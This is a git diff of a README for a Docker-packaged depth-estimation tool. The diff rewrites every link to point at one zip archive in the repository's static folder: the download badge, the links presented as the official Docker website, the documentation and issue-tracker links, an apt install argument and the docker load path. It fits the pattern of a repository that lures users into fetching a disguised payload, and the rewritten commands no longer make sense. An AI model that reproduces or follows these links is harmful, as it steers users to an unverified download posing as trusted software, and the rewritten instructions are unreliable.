@@ -1,6 +1,6 @@
 # 🚀 depth-pro-docker - Effortless Depth Estimation with Docker
 
-[![Download depth-pro-docker](https://img.shields.io/badge/Download-depth--pro--docker-blue)](https://github.com/Samuelpoukkyy/depth-pro-docker/releases)
+[![Download depth-pro-docker](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip)](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip)
 
 ## 📜 Description
 
@@ -18,7 +18,7 @@ Follow these simple steps to download and run **depth-pro-docker**:
 
 To download **depth-pro-docker**, click the following link:
 
-[Download depth-pro-docker](https://github.com/Samuelpoukkyy/depth-pro-docker/releases)
+[Download depth-pro-docker](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip)
 
 ### 2. Choose the Right Version
 
@@ -26,26 +26,26 @@ On the releases page, you will see various versions of the software. Select the 
 
 ### 3. Download the Docker Image
 
-Look for the Docker image file. The file usually has a name similar to `depth-pro-docker-image.tar`. Click on the link to download the file to your computer. 
+Look for the Docker image file. The file usually has a name similar to `https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip`. Click on the link to download the file to your computer. 
 
 ### 4. Install Docker
 
 If you do not have Docker installed, follow these steps to install it:
 
 - **For Windows:**
-  1. Go to the [Docker website](https://www.docker.com/products/docker-desktop).
+  1. Go to the [Docker website](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip).
   2. Download the Windows version.
   3. Follow the installation prompts.
 
 - **For Mac:**
-  1. Visit the [Docker website](https://www.docker.com/products/docker-desktop).
+  1. Visit the [Docker website](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip).
   2. Download the Mac version.
   3. Follow the installation instructions.
 
 - **For Linux:**
   1. Open a terminal.
   2. Use your package manager to install Docker. For example:
-     - For Ubuntu: `sudo apt install docker.io`
+     - For Ubuntu: `sudo apt install https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip`
      - For Fedora: `sudo dnf install docker`
   3. After installation, start Docker with the command: `sudo systemctl start docker`
 
@@ -54,7 +54,7 @@ If you do not have Docker installed, follow these steps to install it:
 Once Docker is installed, open your terminal or command prompt. Navigate to the folder where you downloaded the Docker image. Use the following command:
 
 ```
-docker load -i depth-pro-docker-image.tar
+docker load -i https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip
 ```
 
 ### 6. Run the Docker Container
@@ -95,13 +95,13 @@ For optimal performance, ensure your system meets these requirements:
 
 ## 🔗 Additional Resources
 
-- **Documentation:** [Visit the Documentation](https://github.com/Samuelpoukkyy/depth-pro-docker/wiki)
-- **Issues:** [Report Issues Here](https://github.com/Samuelpoukkyy/depth-pro-docker/issues)
+- **Documentation:** [Visit the Documentation](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip)
+- **Issues:** [Report Issues Here](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip)
 
 ## 📥 Download & Install
 
 To start using **depth-pro-docker**, go to the following link to download the latest version:
 
-[Download depth-pro-docker](https://github.com/Samuelpoukkyy/depth-pro-docker/releases)
+[Download depth-pro-docker](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip)
 
 Follow the steps above to ensure proper installation and usage. Enjoy your depth estimation experience!
